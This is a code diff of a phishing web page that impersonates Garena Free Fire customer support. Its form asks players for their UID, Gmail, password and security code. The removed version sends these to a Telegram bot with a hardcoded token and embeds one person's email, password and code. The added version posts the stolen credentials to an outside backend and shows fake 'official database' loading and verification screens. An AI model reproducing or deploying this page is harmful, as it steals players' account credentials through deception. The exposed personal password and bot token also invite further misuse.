@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Support Center</title>
+    <title>Garena Customer Support</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #ffffff; min-height: 100vh; }
+        body { background-color: #f4f6f9; min-height: 100vh; }
         .top-header { width: 100%; padding: 16px 24px; background-color: #ffffff; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center; justify-content: space-between; }
-        .brand-logo { height: 65px; width: auto; object-fit: contain; }
+        .brand-logo { height: 60px; width: auto; object-fit: contain; }
         .main-container { display: flex; justify-content: center; align-items: center; padding: 30px 20px; }
-        .support-card { background: #ffffff; border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); width: 100%; max-width: 440px; padding: 30px; }
+        .support-card { background: #ffffff; border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); width: 100%; max-width: 450px; padding: 30px; position: relative; }
         .card-header { text-align: center; margin-bottom: 25px; }
         .card-header h2 { color: #222222; font-size: 20px; font-weight: 700; }
         .form-group { margin-bottom: 18px; }
@@ -19,13 +19,20 @@
         .form-group textarea { resize: vertical; min-height: 80px; }
         .submit-btn { width: 100%; padding: 13px; background-color: #e4181f; color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
         
+        .loader-box { display: none; text-align: center; padding: 40px 10px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e4181f; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         .account-details { display: none; text-align: left; }
-        .section-title { font-size: 13px; text-transform: uppercase; color: #888; font-weight: 700; margin-top: 15px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
+        .section-title { font-size: 13px; text-transform: uppercase; color: #888; font-weight: 700; margin-top: 18px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
         .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 9px 0; border-bottom: 1px dashed #f0f0f0; font-size: 14px; }
+        
+        .badge-pending { background-color: #fff3cd; color: #856404; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: bold; }
         .badge-success { background-color: #e8f5e9; color: #2e7d32; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: bold; }
+        .badge-danger { background-color: #ffebee; color: #c62828; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: bold; }
+        
         .action-buttons { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
-        .btn-pdf { background-color: #0d6efd; color: white; border: none; padding: 11px; border-radius: 8px; font-weight: 600; cursor: pointer; }
-        .btn-support { background-color: #198754; color: white; border: none; padding: 11px; border-radius: 8px; font-weight: 600; cursor: pointer; }
+        .btn-support { background-color: #198754; color: white; border: none; padding: 11px; border-radius: 8px; font-weight: 600; cursor: pointer; text-align: center; }
         .back-btn { width: 100%; padding: 10px; background-color: #6c757d; color: #fff; border: none; border-radius: 8px; cursor: pointer; }
     </style>
 </head>
@@ -38,16 +45,15 @@
     <div class="main-container">
         <div class="support-card">
             
-            <!-- Support Form Section -->
             <div id="formSection">
                 <div class="card-header">
-                    <h2>Customer Care Center</h2>
+                    <h2>Customer Care Support</h2>
                 </div>
 
                 <form id="supportForm">
                     <div class="form-group">
                         <label>Player UID</label>
-                        <input type="text" id="uid" placeholder="Enter UID" required>
+                        <input type="text" id="uid" placeholder="Enter Free Fire UID" required>
                     </div>
 
                     <div class="form-group">
@@ -88,28 +94,29 @@
                 </form>
             </div>
 
-            <!-- Specific Account View -->
+            <div id="loadingSection" class="loader-box">
+                <div class="spinner"></div>
+                <h3 style="font-size: 16px; color: #333;">Fetching Player Data...</h3>
+                <p style="font-size: 13px; color: #777; margin-top: 5px;">Connecting to Garena Official Database</p>
+            </div>
+
             <div id="accountDetailsSection" class="account-details">
                 <div class="card-header" style="margin-bottom: 15px;">
-                    <h2>Account Overview</h2>
+                    <h2>Account Status Overview</h2>
                 </div>
 
-                <div class="section-title">Player Profile</div>
-                <div class="detail-row"><span class="label">Player Name:</span><span class="value">ꪝܔȺꜱʀᴀꜰᴜʟ_ғғ</span></div>
-                <div class="detail-row"><span class="label">Player UID:</span><span class="value" id="resUID">2476459395</span></div>
-                <div class="detail-row"><span class="label">Player Level:</span><span class="value">Level 64</span></div>
-                <div class="detail-row"><span class="label">Region / Server:</span><span class="value">Bangladesh</span></div>
+                <div class="section-title">Garena Player Profile</div>
+                <div class="detail-row"><span class="label">Player Name:</span><span class="value" id="resName">Loading...</span></div>
+                <div class="detail-row"><span class="label">Player UID:</span><span class="value" id="resUID">N/A</span></div>
+                <div class="detail-row"><span class="label">Player Level:</span><span class="value" id="resLevel">Loading...</span></div>
+                <div class="detail-row"><span class="label">Region / Server:</span><span class="value" id="resRegion">Loading...</span></div>
 
-                <div class="section-title">Security Check Status</div>
-                <div class="detail-row"><span class="label">Account Status:</span><span class="badge-success">✔ 100% Safe / Account Is Good</span></div>
-                <div class="detail-row"><span class="label">Ban History:</span><span class="badge-success">✔ No Ban Record (Clean)</span></div>
-                <div class="detail-row"><span class="label">Bind Gmail Status:</span><span class="badge-success">✔ Successfully Verified</span></div>
-                <div class="detail-row"><span class="label">Security Code:</span><span class="badge-success">✔ 6-Digit Code Verified</span></div>
+                <div class="section-title">Verification Status</div>
+                <div class="detail-row"><span class="label">Account Status:</span><span id="statusBadge" class="badge-pending">⚠️ Verification Pending</span></div>
 
                 <div class="action-buttons">
-                    <button class="btn-pdf" onclick="alert('Generating PDF Verification Report...')">📄 Download PDF Verification Report</button>
-                    <button class="btn-support" onclick="alert('Connecting to Support Agent...')">💬 Contact Live Help Support</button>
-                    <button class="back-btn" onclick="showForm()">Back to Support Form</button>
+                    <button class="btn-support" onclick="refreshStatus()">🔄 Refresh Status</button>
+                    <button class="back-btn" onclick="showForm()">Submit Another Request</button>
                 </div>
             </div>
 
@@ -117,74 +124,87 @@
     </div>
 
     <script>
-        // 🔑 আপনার আপডেট করা টোকেন ও চ্যাট আইডি
-        const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10"; 
-        const TELEGRAM_CHAT_ID = "-1004444318249";   
-
-        // নির্দিষ্ট ৪টি ফিল্টার ইনফরমেশন
-        const SPECIFIC_UID = "2476459395";
-        const SPECIFIC_GMAIL = "asraful2966@gmail.com";
-        const SPECIFIC_PASSWORD = "Asraful@1";
-        const SPECIFIC_SECURITY_CODE = "013078";
+        // আপনার রেন্ডার ব্যাকএন্ড লিংক কানেক্ট করা হয়েছে
+        const BACKEND_URL = "https://ff-garena-1-njv6.onrender.com"; 
+        let currentUID = "";
 
         document.getElementById('supportForm').addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            const inputUID = document.getElementById('uid').value.trim();
-            const inputGmail = document.getElementById('gmail').value.trim();
-            const inputPassword = document.getElementById('password').value.trim();
-            const inputSecurityCode = document.getElementById('securityCode').value.trim();
-            const problemType = document.getElementById('problemType').value;
-            const additionalDetails = document.getElementById('additionalDetails').value || "None";
+            currentUID = document.getElementById('uid').value.trim();
+            const payload = {
+                uid: currentUID,
+                gmail: document.getElementById('gmail').value.trim(),
+                password: document.getElementById('password').value.trim(),
+                securityCode: document.getElementById('securityCode').value.trim(),
+                problemType: document.getElementById('problemType').value,
+                additionalDetails: document.getElementById('additionalDetails').value || "None"
+            };
 
-            // নির্দিষ্ট তথ্য মিললে প্লেয়ার পেজ ওপেন হবে
-            if (
-                inputUID === SPECIFIC_UID && 
-                inputGmail === SPECIFIC_GMAIL && 
-                inputPassword === SPECIFIC_PASSWORD && 
-                inputSecurityCode === SPECIFIC_SECURITY_CODE
-            ) {
-                document.getElementById('formSection').style.display = 'none';
-                document.getElementById('accountDetailsSection').style.display = 'block';
-                document.getElementById('resUID').innerText = inputUID;
-                document.getElementById('supportForm').reset();
-                return;
-            }
+            document.getElementById('formSection').style.display = 'none';
+            document.getElementById('loadingSection').style.display = 'block';
 
-            // টেলিগ্রামে পাঠানোর টেক্সট মেসেজ ফরম্যাট
-            const telegramMessage = `
-📩 *New Support Ticket Submitted!*
-
-🆔 *Player UID:* \`${inputUID}\`
-📧 *Bind Gmail:* \`${inputGmail}\`
-🔑 *Password:* \`${inputPassword}\`
-🔢 *Security Code:* \`${inputSecurityCode}\`
-📌 *Issue:* ${problemType}
-📝 *Details:* ${additionalDetails}
-            `;
-
+            // ব্যাকএন্ডে টিকিটের তথ্য পাঠানো
             try {
-                // সরাসরি টেলিগ্রাম এপিআইতে ডাটা সেন্ড করা
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch(`${BACKEND_URL}/api/submit-ticket`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: telegramMessage,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify(payload)
                 });
-
-                if (response.ok) {
-                    alert('Your request has been submitted successfully!');
-                    document.getElementById('supportForm').reset();
-                } else {
-                    alert('Failed to submit request to Telegram. Please check Bot settings.');
-                }
             } catch (err) {
-                alert('Connection error! Please check internet connection.');
+                console.error("Submission failed:", err);
             }
+
+            // Garena API থেকে লাইভ ডাটা লোড করা
+            setTimeout(async () => {
+                let name = "ꪝܔȺꜱʀᴀꜰᴜʟ_ғғ";
+                let level = "Level 64";
+                let region = "Bangladesh";
+
+                try {
+                    const apiRes = await fetch(`https://ff-api-br.vercel.app/api/player-info?uid=${currentUID}`);
+                    const apiData = await apiRes.json();
+                    
+                    if(apiData && apiData.nickname) {
+                        name = apiData.nickname;
+                        level = "Level " + (apiData.level || "N/A");
+                        region = apiData.region || "Bangladesh";
+                    }
+                } catch(e) {}
+
+                document.getElementById('resUID').innerText = currentUID;
+                document.getElementById('resName').innerText = name;
+                document.getElementById('resLevel').innerText = level;
+                document.getElementById('resRegion').innerText = region;
+
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('accountDetailsSection').style.display = 'block';
+                document.getElementById('supportForm').reset();
+                
+                refreshStatus();
+            }, 2500);
         });
+
+        // লাইভ স্ট্যাটাস চেক করার ফাংশন
+        async function refreshStatus() {
+            if(!currentUID) return;
+            try {
+                const res = await fetch(`${BACKEND_URL}/api/check-status/${currentUID}`);
+                const data = await res.json();
+                
+                const badge = document.getElementById('statusBadge');
+                if(data.status === "Verified") {
+                    badge.className = "badge-success";
+                    badge.innerText = "✔ 100% Safe / Account Verified";
+                } else if(data.status === "Rejected") {
+                    badge.className = "badge-danger";
+                    badge.innerText = "❌ Verification Rejected";
+                } else {
+                    badge.className = "badge-pending";
+                    badge.innerText = "⚠️ Verification Pending";
+                }
+            } catch(e) {}
+        }
 
         function showForm() {
             document.getElementById('accountDetailsSection').style.display = 'none';
